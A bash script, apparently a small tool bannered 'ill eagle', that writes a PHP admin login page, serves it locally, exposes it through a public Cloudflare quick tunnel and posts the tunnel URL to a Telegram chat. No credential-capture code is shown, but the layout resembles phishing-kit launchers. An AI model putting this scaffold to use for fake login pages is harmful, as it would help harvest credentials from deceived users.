#!/bin/bash
__version__="1.6"

# Load .env file or prompt for setup
if [ -f .env ]; then
    export $(grep -v '^#' .env | xargs)
else
    echo "[!] .env file not found. Creating one with necessary configurations..."
    cat > .env <<EOL
TELEGRAM_BOT_TOKEN=
TELEGRAM_CHAT_ID=
EOL
    echo "Please set your Telegram Bot Token and Chat ID in the .env file, then run the script again."
    exit 1
fi

# Default host and port configuration
HOST='127.0.0.1'
PHP_PORT='8888'

# Color definitions for output
GREEN="\033[32m"
RESET="\033[0m"

# Function to print green text
green_echo() {
    echo -e "${GREEN}${1}${RESET}"
}

# Display project banner
banner() {
    green_echo "========================================"
    green_echo " - - - -  - ill eagle - - - - - - - - - "
    green_echo "========================================"
}

# Kill existing processes
kill_pid() {
    local processes="php cloudflared"
    for process in $processes; do
        local pids=$(pidof $process)
        if [[ -n "$pids" ]]; then
            echo "Killing $process processes with PIDs: $pids"
            killall $process > /dev/null 2>&1
        fi
    done
}

# Install dependencies
dependencies() {
    local pkgs=(php curl unzip git)
    for pkg in "${pkgs[@]}"; do
        if ! command -v "$pkg" &> /dev/null; then
            echo -e "\n[+] Installing package: $pkg"
            sudo apt install "$pkg" -y || sudo apt-get install "$pkg" -y || echo "[!] Failed to install $pkg."
        fi
    done
}

# Download and install Cloudflared
download_cloudflared() {
    if [[ ! -f "$BASE_DIR/.server/cloudflared" ]]; then
        echo -e "\n[+] Downloading Cloudflared..."
        curl -L https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -o "$BASE_DIR/.server/cloudflared"
        chmod +x "$BASE_DIR/.server/cloudflared"
        if [[ ! -f "$BASE_DIR/.server/cloudflared" ]]; then
            echo "[!] Failed to download Cloudflared."
            exit 1
        fi
    else
        echo "[+] Cloudflared already downloaded."
    fi
}

# Start PHP server
start_php_server() {
    if ! lsof -i:$PHP_PORT; then
        echo "Starting PHP server..."
        cd "$BASE_DIR/your_site"
        php -S "$HOST":"$PHP_PORT" > /dev/null 2>&1 &
        echo "PHP server started at http://$HOST:$PHP_PORT"
    else
        echo "PHP server already running on port $PHP_PORT"
    fi
}

# Start Cloudflared and generate URL
start_cloudflared() {
    start_php_server
    sleep 2

    if [[ -f "$BASE_DIR/.server/cloudflared" ]]; then
        echo "Starting Cloudflared..."
        "$BASE_DIR/.server/cloudflared" tunnel -url "http://$HOST:$PHP_PORT" --logfile "$BASE_DIR/.server/.cld.log" > "$BASE_DIR/.server/cloudflared_output.log" 2>&1 &
        sleep 8

        if pgrep -f "cloudflared tunnel"; then
            echo "Cloudflared started successfully."
        else
            echo "Cloudflared failed to start. Check cloudflared_output.log for issues."
            cat "$BASE_DIR/.server/cloudflared_output.log"
            exit 1
        fi

        # Extract Cloudflared URL
        local cldflr_php_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' "$BASE_DIR/.server/cloudflared_output.log" | head -n 1)
        echo "PHP Server URL: $cldflr_php_url"

        send_to_telegram "$cldflr_php_url"
    else
        echo "[!] Cloudflared binary not found. Please check the installation."
        exit 1
    fi
}

# Send URL to Telegram
send_to_telegram() {
    local php_url="$1"
    if [[ -n "$php_url" && -n "$TELEGRAM_BOT_TOKEN" && -n "$TELEGRAM_CHAT_ID" ]]; then
        local message="PHP Server is running at: ${php_url}"
        curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" \
        -d "chat_id=${TELEGRAM_CHAT_ID}" \
        -d "text=${message}"
    else
        echo "[!] Telegram credentials are not set. Please update the .env file with TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID."
    fi
}

# Setup necessary directories and create required files
setup_directories() {
    BASE_DIR=$(realpath "$(dirname "$0")")
    mkdir -p "$BASE_DIR/.server"
    rm -rf "$BASE_DIR/.server/.cld.log"

    # Ensure PHP site directory exists
    if [[ ! -d "$BASE_DIR/your_site" ]]; then
        echo "Creating PHP project directory..."
        mkdir -p "$BASE_DIR/your_site"
    fi

    # Create all required PHP files inline
    cat > "$BASE_DIR/your_site/login.php" <<EOL
<?php
session_start();
if (isset(\$_SESSION['logged_in']) && \$_SESSION['logged_in'] === true) {
    header('Location: admin.php');
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <title>Admin Login</title>
    <link rel="stylesheet" href="styles.css">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>
<body>
    <div class="login-container">
        <form action="authenticate.php" method="post">
            <h2>Admin Login</h2>
            <label for="username">Username:</label>
            <input type="text" name="username" required>
            <label for="password">Password:</label>
            <input type="password" name="password" required>
            <button type="submit">Login</button>
        </form>
    </div>
</body>
</html>
EOL

    # Create .htaccess file for security and URL handling
    cat > "$BASE_DIR/your_site/.htaccess" <<EOL
# Disable directory listing
Options -Indexes

# Protect .env file
<Files .env>
    Order allow,deny
    Deny from all
</Files>

# Rewrite all requests to index.php
RewriteEngine On
RewriteCond %{REQUEST_FILENAME} !-f
RewriteRule ^(.*)$ index.php [QSA,L]
EOL

    # Create robots.txt to restrict search engine access
    cat > "$BASE_DIR/your_site/robots.txt" <<EOL
User-agent: *
Disallow: /login.php
Disallow: /authenticate.php
Disallow: /admin.php
Disallow: /logout.php
EOL
}

# Main execution starts here
banner
setup_directories
kill_pid
dependencies
download_cloudflared
start_cloudflared
